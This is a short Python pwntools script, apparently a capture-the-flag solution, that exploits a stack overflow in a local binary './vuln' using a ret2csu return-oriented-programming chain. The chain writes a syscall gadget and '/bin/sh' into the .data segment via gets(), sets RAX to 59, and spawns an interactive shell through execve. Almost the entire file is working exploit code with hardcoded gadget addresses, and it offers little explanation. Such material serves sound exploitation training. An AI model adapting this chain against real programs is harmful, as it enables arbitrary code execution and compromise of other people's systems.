"""
	ret2csu exploit
"""
from pwn import *
import struct
import time

p = process("./vuln")
pause()
POP_RDI_GADGET = 0x4011cb # pop rdi ; ret
SYSCALL_GADGET = 0x401132 # syscall ; ret
POP_RSI_R15_GADGET = 0x4011c9 # pop rsi ; pop r15 ; ret
GET_NUMBER_FUNCTION_ADDR = 0x401122 # getnumber(unsigned int) -> unsignedd int (RAX)
GETS_PLT_ADDR = 0x401030 # gets@PLT
DATA_SEG_ADDR = 0x404020 # .data segment address
RET_GADGET = 0x401016 # ret
POP_CHAIN_GADGET = 0x4011c4 # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
BIN_SH_STRING_ADDR = 0x7ffff7f6e156 # "/bin/sh"
MOV_CHAIN_GADGET = 0x4011a8 #Â mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call QWORD PTR [r15+rbx*8] 
# Write syscall gadget address in .data
payload = b"A"*72 # offset before controlling RIP
# Set argument for gets() in RDI
payload += p64(POP_RDI_GADGET)
payload += p64(DATA_SEG_ADDR) # RDI => .data address
# Call gets(<.data address>), it will write input to .data address
payload += p64(GETS_PLT_ADDR) # gets(.data)

payload += p64(POP_RDI_GADGET)
payload += p64(DATA_SEG_ADDR+8) # RDI => .data address
# Call gets(<.data address+8>), it will write input to .data address
payload += p64(GETS_PLT_ADDR) # gets(.data+8)

# Now .data contains the address of the `syscall ; ret` gadget
payload += p64(RET_GADGET)
payload += p64(POP_RDI_GADGET)
payload += p64(59) # execve syscall id
payload += p64(GET_NUMBER_FUNCTION_ADDR) # call get_number()
# RAX => 59
payload += p64(POP_RDI_GADGET)
payload += p64(0x0) # execve syscall id

payload += p64(POP_CHAIN_GADGET)
payload += p64(DATA_SEG_ADDR+8) # r12 => EDI
# RDI -> "/bin/sh"
payload += p64(0x0) # r13 => RSI
# RSI => 0
payload += p64(0x0) # r14 => RDX
# RDX => 0
payload += p64(DATA_SEG_ADDR) # r15 -> .data -> syscall
payload += p64(RET_GADGET)
payload += p64(MOV_CHAIN_GADGET)
"""
mov    rdx,r14
mov    rsi,r13
mov    edi,r12d
call   QWORD PTR [r15+rbx*8]
"""
p.sendline(payload)
time.sleep(1)
p.sendline(p64(SYSCALL_GADGET))
time.sleep(1)
p.sendline("/bin/sh")
time.sleep(1)

p.interactive()